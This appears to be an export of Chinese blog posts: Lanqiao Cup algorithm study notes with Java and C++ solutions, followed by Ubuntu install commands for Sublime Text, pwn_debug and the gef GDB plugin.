<h4 id="对字符串里的每一位排序"><a href="#对字符串里的每一位排序" class="headerlink" title="对字符串里的每一位排序"></a>对字符串里的每一位排序</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">char</span> [] char1 = s1.toCharArray();</span><br><span class="line"><span class="keyword">char</span>[] char2 = s2.toCharArray();</span><br><span class="line">Arrays.sort(char1);</span><br><span class="line">Arrays.sort(char2);</span><br></pre></td></tr></table></figure>
<h4 id="判断两字符数组是否相等"><a href="#判断两字符数组是否相等" class="headerlink" title="判断两字符数组是否相等"></a>判断两字符数组是否相等</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> String(char1).equals(<span class="keyword">new</span> String(char2))</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">check</span><span class="params">(<span class="keyword">int</span> src, <span class="keyword">int</span> des)</span> </span>&#123;</span><br><span class="line">	String s1 = String.valueOf(src);<span class="comment">// 数字转字符串</span></span><br><span class="line">	String s2 = String.valueOf(des);</span><br><span class="line">	<span class="keyword">char</span> [] char1 = s1.toCharArray();</span><br><span class="line">	<span class="keyword">char</span>[] char2 = s2.toCharArray();</span><br><span class="line">	Arrays.sort(char1);</span><br><span class="line">	Arrays.sort(char2);</span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">new</span> String(char1).equals(<span class="keyword">new</span> String(char2));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="4-一句话123循环"><a href="#4-一句话123循环" class="headerlink" title="4 一句话123循环"></a>4 一句话123循环</h3><blockquote>
<p> n的变化1 2 3 循环。。。</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">n = n%<span class="number">3</span>+<span class="number">1</span></span><br></pre></td></tr></table></figure>
<p>注意：static方法必须在static类里面</p>
<h4 id="5-堆排序"><a href="#5-堆排序" class="headerlink" title="5 堆排序"></a>5 堆排序</h4><p>emmm，填空题不能单靠简单的上下文，，，，保险起见，要学会自己构造例子看结果。</p>
<h3 id="6-全排列"><a href="#6-全排列" class="headerlink" title="6 全排列"></a>6 全排列</h3><p><img src="/2021/03/08/12-17/image-20210304185430180.png" alt="image-20210304185430180"></p>
<p>给每个边和顶点编号。</p>
<p>全排列+然后计算每个编的值</p>
<h4 id="全排列"><a href="#全排列" class="headerlink" title="全排列"></a>全排列</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">f</span><span class="params">(<span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(k==arr.length) &#123;</span><br><span class="line">		check();</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//已经确定k-1个了，所以从k开始</span></span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=k;i&lt;arr.length;i++) &#123;</span><br><span class="line">		<span class="keyword">int</span> t = arr[i];</span><br><span class="line">		arr[i] = arr[k];</span><br><span class="line">		arr[k] = t;</span><br><span class="line">		</span><br><span class="line">		f(k+<span class="number">1</span>);</span><br><span class="line">		</span><br><span class="line">		t = arr[i];</span><br><span class="line">		arr[i] = arr[k];</span><br><span class="line">		arr[k] = t;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="顶点编号-计算边的值"><a href="#顶点编号-计算边的值" class="headerlink" title="顶点编号+计算边的值"></a>顶点编号+计算边的值</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">check</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">int</span> a = <span class="number">8</span>+arr[<span class="number">0</span>]+arr[<span class="number">1</span>]+arr[<span class="number">2</span>];</span><br><span class="line">	<span class="keyword">int</span> b = <span class="number">3</span>+arr[<span class="number">2</span>]+arr[<span class="number">4</span>]+arr[<span class="number">7</span>];</span><br><span class="line">	<span class="keyword">int</span> c = <span class="number">11</span>+arr[<span class="number">3</span>]+arr[<span class="number">6</span>];</span><br><span class="line">	<span class="keyword">int</span> d = <span class="number">1</span>+arr[<span class="number">1</span>]+arr[<span class="number">4</span>]+arr[<span class="number">8</span>];</span><br><span class="line">	<span class="keyword">int</span> e = arr[<span class="number">5</span>]+arr[<span class="number">6</span>]+arr[<span class="number">7</span>]+arr[<span class="number">8</span>];</span><br><span class="line">	<span class="keyword">int</span> f = <span class="number">1</span>+arr[<span class="number">0</span>]+arr[<span class="number">3</span>]+arr[<span class="number">5</span>];</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span>(a == b &amp;&amp; b==c&amp;&amp; c==d&amp;&amp;d == e&amp;&amp;e==f) &#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; arr.length; i++) &#123;</span><br><span class="line">			System.out.println(arr[i]);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="7-概率题"><a href="#7-概率题" class="headerlink" title="7 概率题"></a>7 概率题</h3><p>涉及概率论的知识，主要用概率论得出公式，然后用计算机计算计算具体的值。。。</p>
<p>有点点麻烦，吐血</p>
<h4 id="数学归纳法"><a href="#数学归纳法" class="headerlink" title="数学归纳法"></a>数学归纳法</h4><ol>
<li>只有一个圈，概率为1</li>
<li>如果n根绳子组成一个圈，那么必定是n-1根绳子组成一个圈然后加入新的绳子</li>
<li>如果n根绳子组成m个圈，可以是n-1根绳子组成m-1个圈，然后新绳自成一圈；也可以是n-1根绳子组成m个圈，然后最后一个新绳加入这个圈。</li>
</ol>
<p>这里面加入一个圈的公式是：</p>
<p><code>f[sheng][1] = f[sheng - 1][1] * (sheng - 1) * 2 / (2 * sheng - 1);</code></p>
<p>看视频吧，，，，总之需要推演的能力</p>
<h3 id="8-递归-循环"><a href="#8-递归-循环" class="headerlink" title="8 递归 / 循环"></a>8 递归 / 循环</h3><p>都可以用，我使用了递归，老师用的循环（更简单，，</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> i,<span class="keyword">int</span> j,<span class="keyword">int</span> s,<span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line"><span class="comment">//		if(vis == 1) &#123;</span></span><br><span class="line"><span class="comment">//			return;</span></span><br><span class="line"><span class="comment">//		&#125;</span></span><br><span class="line">		<span class="keyword">if</span>(steps == k ) &#123;</span><br><span class="line">			x = i;</span><br><span class="line">			y = j;</span><br><span class="line"><span class="comment">//			vis = 1;</span></span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">	<span class="comment">//11 12 22 21 11	</span></span><br><span class="line">		<span class="keyword">if</span>(g[i][j] == <span class="number">0</span>) &#123;<span class="comment">//white</span></span><br><span class="line">			g[i][j] = <span class="number">1</span>;</span><br><span class="line">			<span class="keyword">if</span>(s==<span class="number">1</span>)</span><br><span class="line">				dfs(i,j-<span class="number">1</span>,<span class="number">4</span>,k+<span class="number">1</span>);</span><br><span class="line">			<span class="keyword">else</span> <span class="keyword">if</span>(s==<span class="number">2</span>) </span><br><span class="line">				dfs(i-<span class="number">1</span>,j,s-<span class="number">1</span>,k+<span class="number">1</span>);</span><br><span class="line">			<span class="keyword">else</span> <span class="keyword">if</span>(s ==<span class="number">3</span>)</span><br><span class="line">				dfs(i,j+<span class="number">1</span>,s-<span class="number">1</span>,k+<span class="number">1</span>);</span><br><span class="line">			<span class="keyword">else</span> <span class="keyword">if</span>(s == <span class="number">4</span>)</span><br><span class="line">				dfs(i+<span class="number">1</span>,j,s-<span class="number">1</span>,k+<span class="number">1</span>);</span><br><span class="line">		&#125;<span class="keyword">else</span> <span class="keyword">if</span>(g[i][j] == <span class="number">1</span>) &#123;<span class="comment">//black</span></span><br><span class="line">			g[i][j] = <span class="number">0</span>;</span><br><span class="line">			<span class="keyword">if</span>(s==<span class="number">1</span>)</span><br><span class="line">				dfs(i,j+<span class="number">1</span>,s+<span class="number">1</span>,k+<span class="number">1</span>);</span><br><span class="line">			<span class="keyword">else</span> <span class="keyword">if</span>(s==<span class="number">2</span>) </span><br><span class="line">				dfs(i+<span class="number">1</span>,j,s+<span class="number">1</span>,k+<span class="number">1</span>);</span><br><span class="line">			<span class="keyword">else</span> <span class="keyword">if</span>(s ==<span class="number">3</span>)</span><br><span class="line">				dfs(i,j-<span class="number">1</span>,s+<span class="number">1</span>,k+<span class="number">1</span>);</span><br><span class="line">			<span class="keyword">else</span> <span class="keyword">if</span>(s == <span class="number">4</span>)</span><br><span class="line">				dfs(i-<span class="number">1</span>,j,<span class="number">1</span>,k+<span class="number">1</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<h4 id="字符变数字"><a href="#字符变数字" class="headerlink" title="字符变数字"></a>字符变数字</h4><blockquote>
<p>简化操作</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">s2i</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (s.equals(<span class="string">"U"</span>))</span><br><span class="line">			<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">		<span class="keyword">if</span> (s.equals(<span class="string">"R"</span>))</span><br><span class="line">			<span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">		<span class="keyword">if</span> (s.equals(<span class="string">"D"</span>))</span><br><span class="line">			<span class="keyword">return</span> <span class="number">3</span>;</span><br><span class="line">		<span class="keyword">if</span> (s.equals(<span class="string">"L"</span>))</span><br><span class="line">			<span class="keyword">return</span> <span class="number">4</span>;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<h3 id="9-斐波那契"><a href="#9-斐波那契" class="headerlink" title="9  斐波那契"></a>9  斐波那契</h3><ol>
<li>mod运算不能交换</li>
<li>斐波那契数列 比赛中 用迭代形式来做，不要用递归来做</li>
</ol>
<h4 id="迭代形式"><a href="#迭代形式" class="headerlink" title="迭代形式"></a>迭代形式</h4><p><img src="/2021/03/08/12-17/image-20210304212011899.png" alt="image-20210304212011899"></p>
<h4 id="余数的性质"><a href="#余数的性质" class="headerlink" title="余数的性质"></a>余数的性质</h4><p><code>(A+B)%mod = (A%mod + B%mod)%mod</code></p>
<p><code>(A*B)%mod = (A%mod * B%mod)%mod</code></p>
<h2 id="2015-java-A"><a href="#2015-java-A" class="headerlink" title="2015-java-A"></a>2015-java-A</h2><blockquote>
<p>easy，循环和递归都能做</p>
<p>可以调试着看过程，确保答案正确</p>
</blockquote>
<h3 id="1-easy循环-递归-偶数"><a href="#1-easy循环-递归-偶数" class="headerlink" title="1 easy循环/递归 偶数"></a>1 easy循环/递归 偶数</h3><ol>
<li><code>i&amp;1==0</code> ==&gt; 偶数</li>
<li><code>i mod 2 == 0</code></li>
</ol>
<h3 id="2-日历"><a href="#2-日历" class="headerlink" title="2 日历"></a>2 日历</h3><h4 id="calendar获取时间"><a href="#calendar获取时间" class="headerlink" title="calendar获取时间"></a>calendar获取时间</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">calendar.getTime()<span class="comment">//月份是英文</span></span><br></pre></td></tr></table></figure>
<h4 id="中文"><a href="#中文" class="headerlink" title="中文"></a>中文</h4><p>函数：<code>toLocaleString()</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">c.getTime();</span><br><span class="line">c.getTime().toLocaleString();</span><br></pre></td></tr></table></figure>
<p>结果</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Sat Aug 05 10:23:12 CST 2017</span><br><span class="line">2017年8月5日 上午10:23:12</span><br></pre></td></tr></table></figure>
<h4 id="设置calendar的年月日"><a href="#设置calendar的年月日" class="headerlink" title="设置calendar的年月日"></a>设置calendar的年月日</h4><blockquote>
<p>重点注意month是月份减1。</p>
<p>设置的时候要月份减1，得出结论的时候要月份+1</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//分别设置</span></span><br><span class="line">calendar.set(Calendar.YEAR,<span class="number">2014</span>);</span><br><span class="line">calendar.set(Calendar.MONTH, <span class="number">10</span>);</span><br><span class="line">calendar.set(Calendar.DAY_OF_MONTH, <span class="number">9</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//一起设置</span></span><br><span class="line">calendar.set(<span class="number">2014</span>,<span class="number">10</span>,<span class="number">9</span>);</span><br></pre></td></tr></table></figure>
<h4 id="增加天数"><a href="#增加天数" class="headerlink" title="增加天数"></a>增加天数</h4><ul>
<li>方法一：<code>c.add(Calendar.DATE, 1000);</code></li>
<li>方法二：<code>calendar.add(Calendar.DAY_OF_YEAR, 1000);</code></li>
</ul>
]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>蓝桥杯</tag>
      </tags>
  </entry>
  <entry>
    <title>蓝桥杯算法训练</title>
    <url>/2021/03/08/12-22/</url>
    <content><![CDATA[<blockquote>
<p>暂时不更新了，，，，</p>
</blockquote>
<h2 id="1-区间k大数查询"><a href="#1-区间k大数查询" class="headerlink" title="1. 区间k大数查询"></a>1. 区间k大数查询</h2><blockquote>
<p><del>easy</del></p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> suanfa_train;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.Collections;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">k</span> </span>&#123;</span><br><span class="line">	<span class="keyword">static</span> List&lt;Integer&gt; list = <span class="keyword">new</span> ArrayList&lt;Integer&gt;();</span><br><span class="line">	<span class="keyword">static</span> List&lt;Integer&gt; list2 = <span class="keyword">new</span> ArrayList&lt;Integer&gt;();</span><br><span class="line">	<span class="keyword">static</span> <span class="keyword">int</span> i,j;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		Scanner scan = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">int</span> n = scan.nextInt();<span class="comment">//序列长度</span></span><br><span class="line">		</span><br><span class="line">		<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;n;i++) &#123;</span><br><span class="line">			list.add(scan.nextInt());<span class="comment">//给定的序列</span></span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">int</span> m = scan.nextInt();<span class="comment">//询问个数</span></span><br><span class="line">		<span class="keyword">int</span> start, end, seq;</span><br><span class="line">		String result = <span class="string">""</span>;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;m;i++) &#123;</span><br><span class="line">			start = scan.nextInt();</span><br><span class="line">			end = scan.nextInt();</span><br><span class="line">			seq = scan.nextInt();</span><br><span class="line">			</span><br><span class="line">			list2.clear();<span class="comment">//清空</span></span><br><span class="line">			<span class="keyword">for</span>(j=start-<span class="number">1</span>;j&lt;end;j++) &#123;</span><br><span class="line">				list2.add(list.get(j));<span class="comment">//拷贝</span></span><br><span class="line">			&#125;</span><br><span class="line">			Collections.sort(list2);<span class="comment">//排序</span></span><br><span class="line">			result += list2.get(list2.size()-seq) + <span class="string">"\n"</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		System.out.println(result);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="2-最大最小公倍数"><a href="#2-最大最小公倍数" class="headerlink" title="2. 最大最小公倍数"></a>2. 最大最小公倍数</h2><blockquote>
<p><del>看着表示不会，，，难搞，发现有诀窍</del></p>
<p>数学知识：如果三个数互为质数,那么这三个数的乘积便为它们的最小公倍数。</p>
<p>有以下二种情况。</p>
<ol>
<li>当N为奇数时,那么N,N-1,N-2互为质数,很明显<code>N*N-1*N-2</code>是1到N最小公倍数的最大值。</li>
<li><ul>
<li>当N为偶数时,且能被3整除时,N-1,N-2,N-3互质,此时<code>N-1*N-2*N-3</code>是1到N最小公倍数的最大值；</li>
<li>当N为偶数时,但不能被3整除时,N,N-1,N-3互质,此时<code>N*N-1*N-3</code>是1到N最小公倍数的最大值。</li>
</ul>
</li>
</ol>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> suanfa_train;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Gongbeishu</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">long</span> n = <span class="keyword">new</span> Scanner(System.in).nextLong();</span><br><span class="line">		<span class="keyword">long</span> result = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">if</span>(n==<span class="number">1</span>) &#123;</span><br><span class="line">			result =  <span class="number">1</span>;</span><br><span class="line">		&#125;<span class="keyword">else</span> <span class="keyword">if</span>(n==<span class="number">2</span>) &#123;</span><br><span class="line">			result = <span class="number">2</span>;</span><br><span class="line">		&#125;<span class="keyword">else</span> <span class="keyword">if</span>(n==<span class="number">3</span>) &#123;</span><br><span class="line">			result = <span class="number">2</span> * <span class="number">3</span>;</span><br><span class="line">		&#125;<span class="keyword">else</span> <span class="keyword">if</span>(n%<span class="number">2</span>==<span class="number">1</span>) &#123;</span><br><span class="line">			result = n*(n-<span class="number">1</span>)*(n-<span class="number">2</span>);</span><br><span class="line">		&#125;<span class="keyword">else</span> <span class="keyword">if</span>(n%<span class="number">2</span>==<span class="number">0</span>) &#123;</span><br><span class="line">			<span class="keyword">if</span>(n%<span class="number">3</span>==<span class="number">0</span>) &#123;</span><br><span class="line">				result = (n-<span class="number">1</span>)*(n-<span class="number">2</span>)*(n-<span class="number">3</span>);</span><br><span class="line">			&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">				result = n*(n-<span class="number">1</span>)*(n-<span class="number">3</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		System.out.println(result);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="3-K好数"><a href="#3-K好数" class="headerlink" title="3. K好数"></a>3. K好数</h2><blockquote>
<p>使用动态规划，将运算过程用二维数组保存起来</p>
<p>动态规划学习（参考视频）：<a href="https://www.bilibili.com/video/BV1xb411e7ww?from=search&amp;seid=18026845084239363645" target="_blank" rel="noopener">https://www.bilibili.com/video/BV1xb411e7ww?from=search&amp;seid=18026845084239363645</a></p>
<p>思路：</p>
<ul>
<li>若k=4，l=3（3位4进制）</li>
<li>假设求3开头，即3XX的个数，只需要求XX中0X，1X，3X的个数即可。</li>
<li>对于0X，明显，X只要不为1，有0，2，3.同理，1X有1，3，3X有0，1，3</li>
<li>3XX中XX的个数=0X+1X+3X=3+2+3=8</li>
</ul>
<p>所以状态方程是</p>
<p><code>dp[i][j] = dp[i][j] + dp[i-1][x]</code>（x与j不相邻的变量。） </p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> suanfa_train;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Khaoshu</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		Scanner scan = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">		<span class="keyword">int</span> k = scan.nextInt();<span class="comment">//进制</span></span><br><span class="line">		<span class="keyword">int</span> l = scan.nextInt();<span class="comment">//位数</span></span><br><span class="line">		<span class="keyword">int</span> [][]dp = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">101</span>][<span class="number">101</span>];<span class="comment">//存放结果</span></span><br><span class="line">		<span class="keyword">int</span> mod = <span class="number">1000000007</span>;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">int</span> i,j,x;<span class="comment">//循环的变量</span></span><br><span class="line">		<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;k;i++) &#123;<span class="comment">//长度为1,数量也为1</span></span><br><span class="line">			dp[<span class="number">1</span>][i] = <span class="number">1</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">for</span>(i=<span class="number">2</span>;i&lt;=l;i++) &#123;<span class="comment">//长度从2开始的</span></span><br><span class="line">			<span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;k;j++) &#123;<span class="comment">//k进制(0~k-1)</span></span><br><span class="line">				<span class="keyword">for</span>(x=<span class="number">0</span>;x&lt;k;x++) &#123;<span class="comment">//k进制(0~k-1)</span></span><br><span class="line">					<span class="keyword">if</span>(x!=j-<span class="number">1</span> &amp;&amp; x!=j+<span class="number">1</span>) &#123;<span class="comment">//x与j不相邻的情况</span></span><br><span class="line">						dp[i][j] += dp[i-<span class="number">1</span>][x];<span class="comment">//固定开头为j，则加上位数-1且开头与j不相邻的情况</span></span><br><span class="line">						dp[i][j] %= mod;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">int</span> ans =<span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;k;i++) &#123;</span><br><span class="line">			ans += dp[l][i];<span class="comment">//结果是将所有l位的不同开头加起来</span></span><br><span class="line">			ans %= mod;</span><br><span class="line">		&#125;</span><br><span class="line">		System.out.println(ans);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>参考：<a href="https://blog.csdn.net/selaotou11/article/details/104716314" target="_blank" rel="noopener">https://blog.csdn.net/selaotou11/article/details/104716314</a></p>
<h2 id="4-结点选择"><a href="#4-结点选择" class="headerlink" title="4. 结点选择"></a>4. 结点选择</h2><blockquote>
<p>java有bug，，，很难100分，所以就用c++来做了。</p>
</blockquote>
<p>思路：动态规划。</p>
<ul>
<li><code>dp[cur][0]</code>：不选当前结点所能选出的结点最大值。</li>
<li><code>dp[cur][1]</code>：选当前结点的能选出的最大值。</li>
</ul>
<h3 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h3><p>非常重要</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">v.resize(n+<span class="number">1</span>);</span><br></pre></td></tr></table></figure>
<p>没有这句话，后面v.pushback就会报错。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; &gt;v;<span class="comment">//存储图的二维数组</span></span><br><span class="line"><span class="keyword">int</span> dp[<span class="number">100005</span>][<span class="number">2</span>]=&#123;<span class="number">0</span>&#125;;<span class="comment">//动态规划的数组</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> cur,<span class="keyword">int</span> pre)</span><span class="comment">//dfs，带的参数为当前结点和上一个结点</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; v[cur].<span class="built_in">size</span>(); ++i) &#123;<span class="comment">//循环当前结点的所有结点</span></span><br><span class="line">        <span class="keyword">int</span> sub = v[cur][i];<span class="comment">//循环中的一个子节点</span></span><br><span class="line">        <span class="keyword">if</span>(sub != pre)<span class="comment">//子节点和父结点不通</span></span><br><span class="line">        &#123;</span><br><span class="line">            dfs(sub,cur);<span class="comment">//向下递归，当前结点时sub，上一个结点时cur</span></span><br><span class="line">            <span class="comment">//两种情况</span></span><br><span class="line">            dp[cur][<span class="number">0</span>]+=<span class="built_in">max</span>(dp[sub][<span class="number">1</span>],dp[sub][<span class="number">0</span>]);</span><br><span class="line">            dp[cur][<span class="number">1</span>]+=dp[sub][<span class="number">0</span>];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n,a,b;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;n;</span><br><span class="line">    v.resize(n+<span class="number">1</span>);<span class="comment">//初始化</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; ++i) &#123;</span><br><span class="line">        <span class="built_in">cin</span>&gt;&gt;dp[i][<span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n<span class="number">-1</span>; ++i) &#123;</span><br><span class="line">        <span class="built_in">cin</span>&gt;&gt;a&gt;&gt;b;</span><br><span class="line">        v[a].push_back(b);<span class="comment">//存储图</span></span><br><span class="line">        v[b].push_back(a);</span><br><span class="line">    &#125;</span><br><span class="line">    dfs(<span class="number">1</span>,<span class="number">0</span>);<span class="comment">//当前根结点1，没有上一个结点</span></span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="built_in">max</span>(dp[<span class="number">1</span>][<span class="number">0</span>],dp[<span class="number">1</span>][<span class="number">1</span>])&lt;&lt;<span class="built_in">endl</span>;<span class="comment">//输出结果</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>蓝桥杯</tag>
      </tags>
  </entry>
  <entry>
    <title>软件安装</title>
    <url>/2021/04/30/16-30/</url>
    <content><![CDATA[<h2 id="1-sublime"><a href="#1-sublime" class="headerlink" title="1.sublime"></a>1.sublime</h2><blockquote>
<p>ubuntu下比较好用的编辑器</p>
<p><a href="http://www.sublimetext.com/docs/3/linux_repositories.html" target="_blank" rel="noopener">官网</a></p>
<p>使用的系统：ubuntu 16.04</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ wget -qO - https:&#x2F;&#x2F;download.sublimetext.com&#x2F;sublimehq-pub.gpg | sudo apt-key add -</span><br><span class="line">$ sudo apt-get install apt-transport-https</span><br><span class="line">$ echo &quot;deb https:&#x2F;&#x2F;download.sublimetext.com&#x2F; apt&#x2F;stable&#x2F;&quot; | sudo tee &#x2F;etc&#x2F;apt&#x2F;sources.list.d&#x2F;sublime-text.list</span><br><span class="line">$ sudo apt-get update</span><br><span class="line">$ sudo apt-get install sublime-text</span><br></pre></td></tr></table></figure>
<h2 id="2-pwn-debug"><a href="#2-pwn-debug" class="headerlink" title="2.pwn_debug"></a>2.pwn_debug</h2><blockquote>
<p>用来解决libc版本加载问题，，，</p>
<p><a href="https://github.com/ray-cp/pwn_debug/wiki" target="_blank" rel="noopener">官网</a></p>
</blockquote>
<h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;ray-cp&#x2F;pwn_debug.git</span><br><span class="line">cd pwn_debug</span><br><span class="line">sudo python setup.py install</span><br></pre></td></tr></table></figure>
<h4 id="安装使用的libc"><a href="#安装使用的libc" class="headerlink" title="安装使用的libc"></a>安装使用的libc</h4><p>指定版本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># .&#x2F;build.sh $(version)</span><br><span class="line">.&#x2F;build.sh 2.23</span><br></pre></td></tr></table></figure>
<h2 id="3-gef"><a href="#3-gef" class="headerlink" title="3.gef"></a>3.gef</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wget -q -O ~&#x2F;.gdbinit-gef.py https:&#x2F;&#x2F;github.com&#x2F;hugsy&#x2F;gef&#x2F;raw&#x2F;master&#x2F;gef.py</span><br><span class="line">echo source ~&#x2F;.gdbinit-gef.py &gt;&gt; ~&#x2F;.gdbinit</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">source &#x2F;home&#x2F;winter&#x2F;.gdbinit-gef.py</span><br></pre></td></tr></table></figure>
<h4 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h4><ol>
<li><code>dereference</code></li>
<li>fmtarg</li>
</ol>
